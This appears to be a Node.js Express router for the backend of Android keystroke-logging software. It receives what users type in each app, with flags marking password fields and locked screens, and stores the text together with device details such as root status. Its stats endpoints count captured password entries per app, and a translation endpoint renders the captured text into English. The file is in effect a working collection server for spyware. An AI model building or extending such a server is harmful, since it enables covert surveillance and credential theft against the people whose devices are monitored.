const express = require('express');
const router = express.Router();
const TextInput = require('../models/TextInput');
const { authenticateApiKey } = require('../middleware/auth');
const cacheService = require('../services/cacheService');
const translationService = require('../services/translationService');
const deviceService = require('../services/deviceService');

// POST /api/text-inputs - Save text input with Redis cache
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        // Log full payload received
        console.log('📩 Received text-input payload:', JSON.stringify(req.body, null, 2));
        
        const {
            id,
            timestamp,
            packageName,
            appName,
            deviceId,
            // KEYBOARD INPUT DATA (PRIMARY FOCUS)
            keyboardInput,
            inputField,
            inputType,
            // CONTEXT INFORMATION (MINIMAL)
            screenTitle,
            fieldHint,
            isPassword,
            isScreenLocked,
            // APP CONTEXT (MINIMAL)
            activityName,
            viewId,
            // DEVICE INFO (MINIMAL)
            deviceModel,
            androidVersion
        } = req.body;

        // Validate required fields
        if (!id || !packageName || !appName || !keyboardInput || !deviceId) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: id, packageName, appName, keyboardInput, deviceId'
            });
        }

        // Check if this is a complete message or partial update
        if (inputType === 'complete_message') {
            // Complete message - save directly to database
            console.log('📤 Complete message received, saving directly to DB');
            
            const textInputData = await saveTextInputToDB({
                id, timestamp, packageName, appName, deviceId,
                keyboardInput, inputField, inputType, screenTitle, fieldHint,
                isPassword, isScreenLocked, activityName, viewId, deviceModel, androidVersion
            });

            return res.status(201).json({
                success: true,
                message: 'Complete message saved successfully',
                data: textInputData
            });
        } else {
            // Partial message - use Redis cache system
            console.log('📝 Partial message received, checking cache');
            
            const cacheResult = await cacheService.checkAndUpdateMessage(
                deviceId, packageName, viewId, keyboardInput
            );

            if (cacheResult.shouldUpdate) {
                // Previous message was saved to DB, new message started in cache
                return res.status(201).json({
                    success: true,
                    message: 'Previous message completed and saved, new message cached',
                    data: { cached: true, messageCount: 1 }
                });
            } else if (cacheResult.isPartOfExisting) {
                // Message updated in cache
                return res.status(200).json({
                    success: true,
                    message: 'Message updated in cache',
                    data: { 
                        cached: true, 
                        updateCount: cacheResult.cachedMessage.updateCount,
                        messageLength: cacheResult.cachedMessage.currentText.length
                    }
                });
            } else {
                // New message started in cache
                return res.status(200).json({
                    success: true,
                    message: 'New message cached',
                    data: { cached: true, messageLength: keyboardInput.length }
                });
            }
        }

    } catch (error) {
        console.error('❌ Error processing text input:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to process text input',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// Helper function to save text input to database
async function saveTextInputToDB(data) {
    // Sanitize data to prevent MongoDB validation errors
    const sanitizeValue = (value) => {
        if (value === null || value === undefined) return null;
        if (typeof value === 'object') {
            try {
                return JSON.parse(JSON.stringify(value));
            } catch (e) {
                return String(value);
            }
        }
        return value;
    };

    // Create text input data matching the simplified keyboard input model
    const incoming = {
        id: sanitizeValue(data.id),
        timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
        packageName: sanitizeValue(data.packageName),
        appName: sanitizeValue(data.appName),
        deviceId: sanitizeValue(data.deviceId),
        
        // KEYBOARD INPUT DATA (PRIMARY FOCUS)
        keyboardInput: sanitizeValue(data.keyboardInput) || '',
        inputField: sanitizeValue(data.inputField) || 'text_input',
        inputType: sanitizeValue(data.inputType) || 'complete_message',
        
        // CONTEXT INFORMATION (MINIMAL)
        screenTitle: sanitizeValue(data.screenTitle) || null,
        fieldHint: sanitizeValue(data.fieldHint) || null,
        isPassword: data.isPassword || false,
        isScreenLocked: data.isScreenLocked || false,
        
        // APP CONTEXT (MINIMAL)
        activityName: sanitizeValue(data.activityName) || '',
        viewId: sanitizeValue(data.viewId) || '',
        
        // DEVICE INFO (MINIMAL)
        deviceModel: sanitizeValue(data.deviceModel) || '',
        androidVersion: sanitizeValue(data.androidVersion) || ''
    };

    console.log('🧾 Prepared incoming text-input document:', JSON.stringify(incoming, null, 2));

    // Preserve longest keyboardInput per id to avoid overwriting full input with partials
    const existing = await TextInput.findOne({ id: incoming.id }).lean();
    if (existing) {
        const existingInputLen = (existing.keyboardInput || '').length;
        const incomingInputLen = (incoming.keyboardInput || '').length;
        if (incomingInputLen < existingInputLen) {
            console.log(`↩️ Incoming keyboardInput shorter (${incomingInputLen}) than existing (${existingInputLen}) for id=${incoming.id}. Keeping existing input.`);
            incoming.keyboardInput = existing.keyboardInput;
        }
    }

    // Upsert
    const result = await TextInput.findOneAndUpdate(
        { id: incoming.id },
        { $set: incoming, $setOnInsert: { createdAt: new Date() } },
        { upsert: true, new: true, runValidators: true }
    );

    console.log('✅ Text input saved:', result.id);

    // Create or update device information
    if (data.deviceId) {
        const deviceData = {
            deviceId: data.deviceId,
            deviceModel: data.deviceModel || 'Unknown',
            deviceBrand: data.deviceBrand || '',
            androidVersion: data.androidVersion || '',
            apiLevel: data.apiLevel || 0,
            screenResolution: data.screenResolution || '',
            totalStorage: data.totalStorage || '',
            availableStorage: data.availableStorage || '',
            ramSize: data.ramSize || '',
            cpuArchitecture: data.cpuArchitecture || '',
            isRooted: data.isRooted || false
        };

        const deviceResult = await deviceService.createOrUpdateDevice(deviceData);
        if (deviceResult.success) {
            console.log('📱 Device information updated:', deviceResult.device.deviceId);
        } else {
            console.error('❌ Failed to update device information:', deviceResult.error);
        }
    }

    return {
        id: result._id,
        textInputId: result.id,
        keyboardInput: result.keyboardInput,
        inputField: result.inputField,
        inputType: result.inputType,
        packageName: result.packageName,
        appName: result.appName,
        timestamp: result.timestamp
    };
}

// GET /api/text-inputs - Get text inputs with cache stats
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId, packageName, inputType, limit = 50, offset = 0 } = req.query;
        
        // Build filter
        const filter = {};
        if (deviceId) filter.deviceId = deviceId;
        if (packageName) filter.packageName = packageName;
        if (inputType) filter.inputType = inputType;

        // Get text inputs from database
        const textInputs = await TextInput.find(filter)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .skip(parseInt(offset))
            .lean();

        // Get total count for pagination
        const totalCount = await TextInput.countDocuments(filter);

        // Get cache statistics
        const cacheStats = await cacheService.getCacheStats();

        res.status(200).json({
            success: true,
            count: textInputs.length,
            totalCount: totalCount,
            cacheStats: cacheStats,
            textInputs: textInputs
        });

    } catch (error) {
        console.error('❌ Error fetching text inputs:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch text inputs',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/text-inputs/stats - Get statistics with cache info
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        // Get database statistics
        const totalKeyboardInputs = await TextInput.countDocuments();
        const passwordFields = await TextInput.countDocuments({ isPassword: true });
        const uniqueApps = await TextInput.distinct('packageName');
        const uniqueDevices = await TextInput.distinct('deviceId');
        const avgInputLength = await TextInput.aggregate([
            { $group: { _id: null, avgLength: { $avg: { $strLenCP: '$keyboardInput' } } } }
        ]);

        // Get app breakdown
        const appBreakdown = await TextInput.aggregate([
            {
                $group: {
                    _id: '$packageName',
                    count: { $sum: 1 },
                    appName: { $first: '$appName' },
                    passwordFields: { $sum: { $cond: ['$isPassword', 1, 0] } },
                    avgInputLength: { $avg: { $strLenCP: '$keyboardInput' } }
                }
            },
            { $sort: { count: -1 } }
        ]);

        // Get input types breakdown
        const inputTypes = await TextInput.distinct('inputType');

        // Get cache statistics
        const cacheStats = await cacheService.getCacheStats();

        res.status(200).json({
            success: true,
            data: {
                stats: {
                    totalKeyboardInputs,
                    passwordFields,
                    uniqueApps: uniqueApps.length,
                    uniqueDevices: uniqueDevices.length,
                    avgInputLength: avgInputLength[0]?.avgLength || 0,
                    inputTypes: inputTypes.length
                },
                appBreakdown,
                cacheStats
            }
        });

    } catch (error) {
        console.error('❌ Error fetching text input statistics:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch text input statistics',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// POST /api/text-inputs/complete-cache - Force complete all cached messages
router.post('/complete-cache', authenticateApiKey, async (req, res) => {
    try {
        await cacheService.completeAllPendingMessages();
        
        res.status(200).json({
            success: true,
            message: 'All cached messages completed and saved to database'
        });
    } catch (error) {
        console.error('❌ Error completing cached messages:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to complete cached messages',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/text-inputs/cache-stats - Get detailed cache statistics
router.get('/cache-stats', authenticateApiKey, async (req, res) => {
    try {
        const cacheStats = await cacheService.getCacheStats();
        
        res.status(200).json({
            success: true,
            cacheStats
        });
    } catch (error) {
        console.error('❌ Error fetching cache statistics:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch cache statistics',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/text-inputs/cache-stats/:deviceId - Get cache statistics for specific device
router.get('/cache-stats/:deviceId', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId } = req.params;
        const deviceCacheStats = await cacheService.getDeviceCacheStats(deviceId);
        
        res.status(200).json({
            success: true,
            deviceCacheStats
        });
    } catch (error) {
        console.error('❌ Error fetching device cache statistics:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch device cache statistics',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// POST /api/text-inputs/keep-alive - Self-ping endpoint to keep server alive
router.post('/keep-alive', authenticateApiKey, async (req, res) => {
    try {
        const timestamp = new Date().toISOString();
        console.log(`🔄 Keep-alive ping received at ${timestamp}`);
        
        res.status(200).json({
            success: true,
            message: 'Server keep-alive ping successful',
            timestamp: timestamp,
            serverStatus: 'active'
        });
    } catch (error) {
        console.error('❌ Error in keep-alive endpoint:', error);
        res.status(500).json({
            success: false,
            message: 'Keep-alive ping failed',
            error: error.message
        });
    }
});

// GET /api/text-inputs/keep-alive - GET version for browser compatibility
router.get('/keep-alive', authenticateApiKey, async (req, res) => {
    try {
        const timestamp = new Date().toISOString();
        console.log(`🔄 Keep-alive GET ping received at ${timestamp}`);
        
        res.status(200).json({
            success: true,
            message: 'Server keep-alive GET ping successful',
            timestamp: timestamp,
            serverStatus: 'active'
        });
    } catch (error) {
        console.error('❌ Error in keep-alive GET endpoint:', error);
        res.status(500).json({
            success: false,
            message: 'Keep-alive GET ping failed',
            error: error.message
        });
    }
});

// POST /api/text-inputs/translate/:id - Translate text input
router.post('/translate/:id', authenticateApiKey, async (req, res) => {
    try {
        const textInputId = req.params.id;
        
        const textInput = await TextInput.findById(textInputId);
        if (!textInput) {
            return res.status(404).json({
                success: false,
                message: 'Text input not found'
            });
        }

        const translationResult = await translationService.translateTextInput(textInput);
        
        if (!translationResult.success) {
            return res.status(400).json({
                success: false,
                message: 'Translation failed',
                error: translationResult.error
            });
        }

        res.json({
            success: true,
            data: {
                textInputId: textInputId,
                originalText: textInput.keyboardInput || textInput.text,
                originalLanguage: translationResult.originalLanguage,
                translation: translationResult.translation,
                isEnglish: translationResult.isEnglish,
                cached: translationResult.cached || false
            }
        });

    } catch (error) {
        console.error('Error translating text input:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to translate text input',
            error: error.message
        });
    }
});

module.exports = router;